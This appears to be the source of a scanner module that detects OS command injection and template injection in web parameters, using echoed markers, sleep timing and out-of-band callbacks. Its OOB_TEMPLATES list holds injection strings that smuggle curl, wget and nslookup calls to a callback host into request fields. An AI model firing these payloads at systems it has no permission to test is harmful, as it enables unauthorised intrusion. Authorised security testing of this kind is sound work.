"""Remote Code Execution / OS command injection scanner.

Detects:
  * direct in-band command injection (echoed marker)
  * blind RCE via response timing (sleep payloads)
  * **blind RCE via OOB DNS/HTTP callback** (interactsh)
  * SSTI engines that evaluate {{7*7}} -> 49 etc.
"""
from __future__ import annotations

import asyncio
import re
import time
from typing import TYPE_CHECKING

from core.utils import merge_query, random_token

if TYPE_CHECKING:
    from core.orchestrator import Context

MARKER_RE = re.compile(r"SX_([a-z0-9]{4,12})_OK")
SSTI_PRODUCT_RE = re.compile(r"\b49\b")
SSTI_OBJECT_HINTS = ("<class 'object'>", "<built-in", "java.lang", "Werkzeug")

OOB_TEMPLATES = [
    ";curl http://{host}/sx;",
    "|curl http://{host}/sx",
    "&& wget -qO- http://{host}/sx",
    "$(curl http://{host}/sx)",
    "`curl http://{host}/sx`",
    ";nslookup {host};",
    "|nslookup {host}",
    "%0acurl%20http://{host}/sx",
]


async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
    findings: list[dict] = []
    rce_payloads = ctx.payloads.for_category("rce", limit=18)
    ssti_payloads = ctx.payloads.for_category("ssti", limit=12)
    sem = asyncio.Semaphore(int(ctx.config.get("concurrency", {}).get("scanner_workers", 8)))
    oob_tokens: dict[str, str] = {}

    # Baseline (clean request) — used to kill "the marker was already there"
    # false positives on both the timing and SSTI paths.
    from core.baseline import TimingBaseline
    tb = TimingBaseline(k=6.0, min_delta_s=2.0)
    base_body = ""
    for _ in range(4):
        ev0 = await ctx.http.get(url)
        if ev0.error or ev0.status == 0:
            continue
        base_body = ev0.response_body or ""
        tb.add((ev0.elapsed_ms or 0.0) / 1000.0)
    base_rtt = tb.median
    # must be BOTH a statistical outlier and ≥3s slower than the baseline
    time_threshold = max(tb.threshold(), base_rtt + 3.0) if tb.samples else 4.5

    async def test(param: str) -> None:
        # ----- in-band OS command injection -----
        for p in rce_payloads:
            async with sem:
                ev = await _request(ctx, url, method, param, p, form)
            if MARKER_RE.search(ev.response_body or ""):
                findings.append({
                    "category": "rce",
                    "title": f"OS command injection in `{param}`",
                    "severity": "critical", "cvss": 9.8,
                    "url": url, "parameter": param, "payload": p,
                    "evidence": "Injected echo marker (SX_*_OK) returned in response body — confirms RCE.",
                    "request": f"{ev.method} {ev.url}",
                    "response": (ev.response_body or "")[:1500],
                    "metadata": {"detection": "marker"},
                })
                ctx.memory.record_payload_result(p, "rce", True)
                return
            ctx.memory.record_payload_result(p, "rce", False)

        # ----- blind RCE via OOB callback -----
        if ctx.oob and ctx.oob.registered:
            token = ctx.oob.token()
            host = ctx.oob.host_for(token)
            oob_tokens[param] = token
            ctx.oob.register(token, {
                "category": "rce",
                "title": f"Blind OS command injection in `{param}` (OOB)",
                "severity": "critical", "cvss": 9.8,
                "url": url, "parameter": param, "payload": f"oob://{host}",
                "evidence": f"An injected command in `{param}` caused the server to reach our "
                            "out-of-band host — confirms blind command execution.",
                "_detection": "oob", "_method": method.upper(),
                "_request": f"{method.upper()} {url}  ({param} = OS command referencing {host})",
                "_oob_ref": host,
            })
            for tpl in OOB_TEMPLATES:
                async with sem:
                    await _request(ctx, url, method, param, tpl.format(host=host), form)

        # ----- blind RCE via timing -----
        # Precision: sleep response must be BOTH a statistical outlier vs the
        # baseline AND ≥3s slower than a no-sleep control injected the same
        # way, confirmed twice. A merely slow page fails the control delta.
        sleep_payload = ";sleep 5;"
        control_payload = ";echo SXCTRL;"
        t0 = time.perf_counter()
        async with sem:
            await _request(ctx, url, method, param, control_payload, form)
        ctrl_elapsed = time.perf_counter() - t0
        t0 = time.perf_counter()
        async with sem:
            ev = await _request(ctx, url, method, param, sleep_payload, form)
        elapsed = time.perf_counter() - t0
        if elapsed >= time_threshold and (elapsed - ctrl_elapsed) >= 3.0 and ev.status:
            t0 = time.perf_counter()
            async with sem:
                await _request(ctx, url, method, param, sleep_payload, form)
            elapsed2 = time.perf_counter() - t0
            if elapsed2 >= time_threshold:
                findings.append({
                    "category": "rce",
                    "title": f"Blind OS command injection in `{param}` (time-based)",
                    "severity": "critical", "cvss": 9.8,
                    "url": url, "parameter": param, "payload": sleep_payload,
                    "evidence": f"Two sleep injections delayed the response {elapsed:.2f}s / "
                                f"{elapsed2:.2f}s vs {ctrl_elapsed:.2f}s for the no-sleep control "
                                f"(baseline median {base_rtt:.2f}s, outlier threshold "
                                f"{time_threshold:.2f}s) — confirms blind RCE.",
                    "request": f"{ev.method} {ev.url}",
                    "metadata": {"elapsed_s": elapsed, "detection": "time"},
                })
                return

        # ----- SSTI -----
        for p in ssti_payloads:
            async with sem:
                ev = await _request(ctx, url, method, param, p, form)
            body = ev.response_body or ""
            if not body:
                continue
            # The product/hint must be NEW in the response relative to the
            # baseline — a page that statically contains "49" or "Werkzeug"
            # must never count as an evaluated expression.
            if "{{7*7}}" in p:
                triggered = (SSTI_PRODUCT_RE.search(body) and "{{7*7}}" not in body
                             and not SSTI_PRODUCT_RE.search(base_body))
            elif "7*'7'" in p:
                triggered = ("7777777" in body and "7*'7'" not in body
                             and "7777777" not in base_body)
            else:
                triggered = any(h in body for h in SSTI_OBJECT_HINTS) and \
                    not any(h in base_body for h in SSTI_OBJECT_HINTS)
            if triggered:
                findings.append({
                    "category": "ssti",
                    "title": f"Server-side template injection in `{param}`",
                    "severity": "critical", "cvss": 9.0,
                    "url": url, "parameter": param, "payload": p,
                    "evidence": "Template engine evaluated injected expression — escalation to RCE likely.",
                    "request": f"{ev.method} {ev.url}",
                    "response": body[:1500],
                    "metadata": {"detection": "ssti-product"},
                })
                ctx.memory.record_payload_result(p, "ssti", True)
                return
            ctx.memory.record_payload_result(p, "ssti", False)

    await asyncio.gather(*(test(p) for p in params))

    # poll OOB once for any blind RCE callbacks
    if ctx.oob and ctx.oob.registered and oob_tokens:
        await asyncio.sleep(2.0)
        for param, token in oob_tokens.items():
            events = await ctx.oob.poll(token)
            if events:
                findings.append({
                    "category": "rce",
                    "title": f"Blind OS command injection in `{param}` (OOB)",
                    "severity": "critical", "cvss": 9.8,
                    "url": url, "parameter": param, "payload": f"oob://{token}",
                    "evidence": f"OOB callback received from injected command "
                                f"({len(events)} interactions) — confirms blind RCE.",
                    "request": f"{method.upper()} {url}",
                    "metadata": {"detection": "oob",
                                 "kinds": sorted({e.get("protocol", "?") for e in events})},
                })
    return findings


async def _request(ctx, url, method, param, value, form):
    from core.injection import send
    return await send(ctx, url, method, param, value, form)
